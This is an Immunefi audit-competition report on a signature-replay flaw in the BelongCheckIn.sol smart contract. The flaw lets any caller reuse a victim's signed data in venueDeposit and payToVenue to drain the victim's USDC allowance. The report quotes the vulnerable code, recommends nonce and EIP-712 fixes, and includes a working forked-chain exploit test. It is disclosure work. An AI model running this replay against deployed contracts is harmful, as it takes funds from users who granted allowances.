# 57453 sc low attackers can drain user allowance provided to the belongcheckin sol

**Submitted on Oct 26th 2025 at 10:36:18 UTC by @kaysoft for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57453
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/platform/BelongCheckIn.sol>
* **Impacts:** Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

### Brief/Intro

The `venueDeposit(..)` and `payToVenue(...)` functions of BelongCheckIn.sol use `USDC.safeTransferFrom(from, address(this), amount)` to pull USDC from users.

The `from` address is user-supplied as a parameter to `venueDeposit(..)` and `payToVenue(...)`.

This allows anyone to call `venueDeposit(..)` and `payToVenue(...)` with the same message/signature values previously used by a user and drain the token allowance that user has granted to BelongCheckIn.sol.

### Vulnerability Details

There are two causes of this issue:

1. The `venueDeposit(..)` and `payToVenue(...)` functions use a user-supplied address as the `from` parameter in `safeTransferFrom(...)`.
2. The signed messages used with `venueDeposit(..)` and `payToVenue(...)` do not include a nonce to prevent replay attacks and do not include the verifying contract in the signed message to prevent cross-contract signature replay attacks.

As a result, users who have granted allowance to the contract are vulnerable: previously used message+signature pairs can be replayed multiple times to drain a user's USDC allowance.

Example relevant code snippet (from BelongCheckIn.sol):

```solidity
function venueDeposit(VenueInfo calldata venueInfo) external {
    BelongCheckInStorage memory _storage = belongCheckInStorage;

    _storage.contracts.factory.nftFactoryParameters().signerAddress.checkVenueInfo(venueInfo);

    VenueStakingRewardInfo memory stakingInfo =
    stakingRewards[_storage.contracts.staking.balanceOf(venueInfo.venue).stakingTiers()].venueStakingInfo;

    address affiliate;
    uint256 affiliateFee;
    if (venueInfo.referralCode != bytes32(0)) {
        affiliate = _storage.contracts.factory.getReferralCreator(venueInfo.referralCode);
        require(affiliate != address(0), WrongReferralCode(venueInfo.referralCode));

        affiliateFee = _storage.fees.affiliatePercentage.calculateRate(venueInfo.amount);
    }

    uint256 venueId = venueInfo.venue.getVenueId();

    if (generalVenueInfo[venueInfo.venue].remainingCredits < _storage.fees.referralCreditsAmount) {
        unchecked {
            ++generalVenueInfo[venueInfo.venue].remainingCredits;
        }
    } else {
        // Collect deposit fee to this contract, then apply buyback/burn split and forward remainder.
        uint256 platformFee = stakingInfo.depositFeePercentage.calculateRate(venueInfo.amount);
        _storage.paymentsInfo.usdc.safeTransferFrom(venueInfo.venue, address(this), platformFee);
        _handleRevenue(_storage.paymentsInfo.usdc, platformFee);
    }

    _setVenueRules(venueInfo.venue, venueInfo.rules);

    _storage.paymentsInfo.usdc
        .safeTransferFrom(venueInfo.venue, address(this), stakingInfo.convenienceFeeAmount + affiliateFee);

    _storage.paymentsInfo.usdc
        .safeTransferFrom(venueInfo.venue, address(_storage.contracts.escrow), venueInfo.amount);

    uint256 convenienceFeeLong =
        _swapUSDCtoLONG(address(_storage.contracts.escrow), stakingInfo.convenienceFeeAmount);
    _swapUSDCtoLONG(affiliate, affiliateFee);

    _storage.contracts.escrow.venueDeposit(venueInfo.venue, venueInfo.amount, convenienceFeeLong);

    _storage.contracts.venueToken.mint(venueInfo.venue, venueId, venueInfo.amount, venueInfo.uri);

    emit VenuePaidDeposit(venueInfo.venue, venueInfo.referralCode, venueInfo.rules, venueInfo.amount);
}
```

## Impact Details

For users that have a non-zero allowance granted to BelongCheckIn.sol, and who have previously called `venueDeposit(..)` (or `payToVenue(..)`) with signed data, an attacker can reuse the same values and signature multiple times to drain USDC from the user's allowance up to the existing allowance amount.

## Recommendation

{% hint style="info" %}

* Use `msg.sender` as the `from` address in calls to `safeTransferFrom(...)` instead of accepting an externally supplied `from` address.
* Ensure signatures follow an EIP-712-style scheme including at least: nonce, deadline, and verifying contract (domain separator). With a `msg.sender`-specific increasing nonce, signatures can be executed only once.
  {% endhint %}

## Proof of Concept

{% stepper %}
{% step %}

### PoC: Steps to reproduce (high-level)

1. Add the provided test to the test suite.
2. Run the test suite (`yarn test`).
3. The test demonstrates: a victim approves max USDC allowance and calls `venueDeposit(..)` / `payToVenue(..)`. An attacker then calls the same function with the same parameters and signature and can pull USDC from the victim up to their allowance.
   {% endstep %}

{% step %}

### PoC: Test code to reproduce (insert into test suite)

Copy and paste the following test into `belong-check-in-bsc-fork.test.ts` in the `describe('Customer flow usdc payment', () => {` suite, then run `yarn test`.

```typescript
it('drain users with safetransferfrom:kaysoft', async () => {
      const { belongCheckIn, signer, USDC, USDC_whale, CAKE_whale, WBNB_whale } = await loadFixture(fixture);

      const uri = 'uriuri';
      const venueAmount = await u(100, USDC);
      const venue = USDC_whale.address;
      const venueMessage = ethers.utils.solidityKeccak256(
        ['address', 'bytes32', 'string', 'uint256'],
        [venue, ethers.constants.HashZero, uri, chainId],
      );
      const venueSignature = EthCrypto.sign(signer.privateKey, venueMessage);
      const venueInfo: VenueInfoStruct = {
        rules: { paymentType: 1, bountyType: 0, longPaymentType: 0 } as VenueRulesStruct,
        venue,
        amount: venueAmount,
        referralCode: ethers.constants.HashZero,
        uri,
        signature: venueSignature,
      };
      const willBeTaken = convenienceFeeAmount.add(venueAmount);
      //1. Victim provides max allowance for ease of use and this can be drained by anyone
      await USDC.connect(USDC_whale).approve(belongCheckIn.address, u(10000000, USDC));
      await belongCheckIn.connect(USDC_whale).venueDeposit(venueInfo);
      //2. WBNB_whale is the attacker and can deposit user allowance to grief them
      await belongCheckIn.connect(WBNB_whale).venueDeposit(venueInfo);

      const customerAmount = await u(5, USDC);
      const customerMessage = ethers.utils.solidityKeccak256(
        ['bool', 'uint128', 'uint24', 'address', 'address', 'address', 'uint256', 'uint256'],
        [
          true, // paymentInUSDC
          0, // visitBountyAmount
          0, // spendBountyPercentage
          CAKE_whale.address, // customer
          USDC_whale.address, // venueToPayFor
          ethers.constants.AddressZero, // promoter
          customerAmount, // amount
          chainId, // block.chainid
        ],
      );
      const customerSignature = EthCrypto.sign(signer.privateKey, customerMessage);
      const customerInfo: CustomerInfoStruct = {
        paymentInUSDC: true,
        visitBountyAmount: 0,
        spendBountyPercentage: 0,
        customer: CAKE_whale.address,
        venueToPayFor: USDC_whale.address,
        promoter: ethers.constants.AddressZero,
        amount: customerAmount,
        signature: customerSignature,
      };

      await USDC.connect(USDC_whale).transfer(CAKE_whale.address, customerAmount);
      //4. Victim: CAKE_whale also provided max allowance which can be griefed with transferfrom
      await USDC.connect(CAKE_whale).approve(belongCheckIn.address, u(10000000, USDC));

      const customerBalance_before = await USDC.balanceOf(CAKE_whale.address);
      const venueBalance_before = await USDC.balanceOf(USDC_whale.address);

      const tx = await belongCheckIn.connect(CAKE_whale).payToVenue(customerInfo);

      //5. Attacker:WBNB_whale repeatedly pull Usdc from victim: CAKE_whale
      await belongCheckIn.connect(WBNB_whale).payToVenue(customerInfo);


      const customerBalance_after = await USDC.balanceOf(CAKE_whale.address);
      const venueBalance_after = await USDC.balanceOf(USDC_whale.address);

      //6.Victim's balances have been deposited through the transferfrom function
      expect(customerBalance_before.sub(customerAmount)).to.not.eq(customerBalance_after);
      expect(venueBalance_before.add(customerAmount)).to.not.eq(venueBalance_after);
    });
```

{% endstep %}
{% endstepper %}
